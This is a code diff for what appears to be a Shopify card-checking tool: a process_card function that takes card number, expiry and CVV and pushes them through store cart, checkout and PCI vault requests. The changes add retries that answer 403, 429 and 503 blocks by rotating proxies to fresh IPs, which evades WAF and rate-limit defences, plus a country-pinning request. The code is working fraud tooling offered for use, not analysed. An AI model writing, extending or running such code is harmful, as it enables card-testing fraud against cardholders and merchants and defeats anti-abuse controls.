@@ -1225,13 +1225,25 @@ async def storefront_cart_add(session, domain, numeric_variant_id, quantity,
     h["accept"] = "application/json, text/javascript, */*; q=0.01"
     h["x-requested-with"] = "XMLHttpRequest"
     h["referer"] = referer or f"{domain}/"
-    try:
-        r = await session.post(f"{domain}/cart/add.js",
-                               data={"id": str(numeric_variant_id), "quantity": str(quantity),
-                                     "form_type": "product", "utf8": "✓"},
-                               headers=h, proxy=proxy, timeout=15)
-    except Exception as e:
-        print(f"[cart] ❌ {str(e)[:150]}")
+    r = None
+    for _try in range(4):
+        try:
+            r = await session.post(f"{domain}/cart/add.js",
+                                   data={"id": str(numeric_variant_id), "quantity": str(quantity),
+                                         "form_type": "product", "utf8": "✓"},
+                                   headers=h, proxy=proxy, timeout=15)
+        except Exception as e:
+            print(f"[cart] ⚠️ {_try+1}/4 {str(e)[:100]}")
+            await asyncio.sleep(0.8)
+            continue
+        if r.status_code in (403, 429, 503) and _try < 3:
+            # rotating egress: retry exits a new IP
+            print(f"[cart] ⚠️ HTTP {r.status_code} (try {_try+1}/4)")
+            await asyncio.sleep(1.0 + 0.8 * _try)
+            continue
+        break
+    if r is None:
+        print(f"[cart] ❌ all attempts failed")
         return False, "Change Proxy"
     if r.status_code == 422:
         try:
@@ -1286,35 +1298,48 @@ async def resolve_checkout_after_cart(session, domain, cart_html, proxy, profile
     data = {"checkout": ""}
     tok = extract_between(cart_html or "", 'name="authenticity_token" value="', '"')
     if tok: data["authenticity_token"] = tok
-    try:
-        r = await session.post(f"{domain}/cart", data=data, headers=post_h,
-                               proxy=proxy, timeout=15, allow_redirects=False)
-        loc = r.headers.get("Location") or r.headers.get("location")
-        if loc and "customer_authentication" in loc:
-            return None, "LOGIN_REQUIRED", None
-        if loc:
-            full = loc if loc.startswith("http") else f"{domain}{loc}"
-            try:
-                redir_h = build_headers(profile, domain, for_document=True,
-                                        sec_fetch_site="same-origin", with_user=False)
-                redir_h["referer"] = f"{domain}/cart"
-                r2 = await session.get(full, headers=redir_h, proxy=proxy,
-                                       timeout=20, allow_redirects=True)
-                if "/checkouts/" in str(r2.url):
-                    return str(r2.url), r2.text, r2
-                if "customer_authentication" in str(r2.url) or "authentication" in str(r2.url):
-                    return None, "LOGIN_REQUIRED", None
-            except Exception: pass
-    except Exception: pass
+    # rotating egress: retry the whole creation up to 3× — each try exits a new IP
+    for _round in range(3):
+        try:
+            r = await session.post(f"{domain}/cart", data=data, headers=post_h,
+                                   proxy=proxy, timeout=15, allow_redirects=False)
+            loc = r.headers.get("Location") or r.headers.get("location")
+            if loc and "customer_authentication" in loc:
+                return None, "LOGIN_REQUIRED", None
+            if loc:
+                full = loc if loc.startswith("http") else f"{domain}{loc}"
+                try:
+                    redir_h = build_headers(profile, domain, for_document=True,
+                                            sec_fetch_site="same-origin", with_user=False)
+                    redir_h["referer"] = f"{domain}/cart"
+                    r2 = await session.get(full, headers=redir_h, proxy=proxy,
+                                           timeout=20, allow_redirects=True)
+                    if "/checkouts/" in str(r2.url):
+                        return str(r2.url), r2.text, r2
+                    if "customer_authentication" in str(r2.url) or "authentication" in str(r2.url):
+                        return None, "LOGIN_REQUIRED", None
+                except Exception: pass
+            else:
+                # WAF/no-location — retry round exits a fresh IP
+                await asyncio.sleep(0.8 + 0.6 * _round)
+                continue
+        except Exception:
+            await asyncio.sleep(0.6)
+            continue
+        break
 
-    try:
-        direct_h = build_headers(profile, domain, for_document=True, sec_fetch_site="same-origin", with_user=True)
-        direct_h["referer"] = f"{domain}/cart"
-        r = await session.get(f"{domain}/checkout?currency={currency}", headers=direct_h,
-                              proxy=proxy, timeout=20, allow_redirects=True)
-        if "/checkouts/" in str(r.url):
-            return str(r.url), r.text, r
-    except Exception: pass
+    for _try in range(2):
+        try:
+            direct_h = build_headers(profile, domain, for_document=True, sec_fetch_site="same-origin", with_user=True)
+            direct_h["referer"] = f"{domain}/cart"
+            r = await session.get(f"{domain}/checkout?currency={currency}", headers=direct_h,
+                                  proxy=proxy, timeout=20, allow_redirects=True)
+            if "/checkouts/" in str(r.url):
+                return str(r.url), r.text, r
+        except Exception:
+            await asyncio.sleep(0.6)
+            continue
+        break
     return None, None, None
 
 
@@ -1540,11 +1565,14 @@ _PROXY_GLock = threading.Lock()
 PROXY_MAX_CONCURRENT = 2
 
 def _proxy_gate(proxy):
+    # THREADING semaphore (not asyncio): each request runs its own event loop,
+    # so an asyncio.Semaphore would be bound to the first request's loop and
+    # blow up with "attached to a different loop" under concurrency.
     key = (proxy or "direct").split("@")[-1] or "direct"
     with _PROXY_GLock:
         sem = _PROXY_SEMAPHORES.get(key)
         if sem is None:
-            sem = asyncio.Semaphore(PROXY_MAX_CONCURRENT)
+            sem = threading.BoundedSemaphore(PROXY_MAX_CONCURRENT)
             _PROXY_SEMAPHORES[key] = sem
     return sem
 
@@ -1636,8 +1664,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             # The old /localization POST 404s on most stores, and IP-geo markets
             # (e.g. IN on US stores) make the seller proposal UnavailableTerms.
             loc_country = "US"
-            if os.environ.get("SHOPIFY_PIN_DISABLE"):
-                print("[pin] disabled by env")
+            try:
+                pin_h = build_headers(profile, ourl, for_document=True)
+                pin_h["referer"] = f"{ourl}/"
+                r_pin = await session.get(
+                    f"{ourl}/?country={loc_country}&currency={currency}",
+                    headers=pin_h, proxy=proxy, timeout=12, allow_redirects=True)
+                print(f"[pin] country={loc_country} currency={currency} → {str(r_pin.url)[:90]}")
+            except Exception as e:
+                print(f"[pin] ⚠️ {str(e)[:80]}")
 
             add_referer = f"{ourl}/products/{product_handle}" if product_handle else f"{ourl}/"
             ok, payload = await storefront_cart_add(
@@ -2319,14 +2354,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 vh["shopify-identification-signature"] = ident_sig
 
             token = None; last_err = None
-            for _attempt in range(4):
+            for _attempt in range(6):
                 try:
                     r_v = await session.post(
                         "https://checkout.pci.shopifyinc.com/sessions",
                         json=vault_payload, headers=vh, proxy=proxy,
                         timeout=VAULT_TIMEOUT)
-                    if r_v.status_code == 429:
-                        await asyncio.sleep(_throttle_wait(r_v, 4.0 + 2.0 * _attempt)); continue
+                    if r_v.status_code in (403, 429, 503):
+                        # rotating egress: next attempt exits a new IP
+                        await asyncio.sleep(_throttle_wait(r_v, 3.0 + 1.5 * _attempt)); continue
                     if r_v.status_code not in (200, 201):
                         last_err = f"PCI HTTP {r_v.status_code}"
                         await asyncio.sleep(1.2 + 0.8 * _attempt); continue
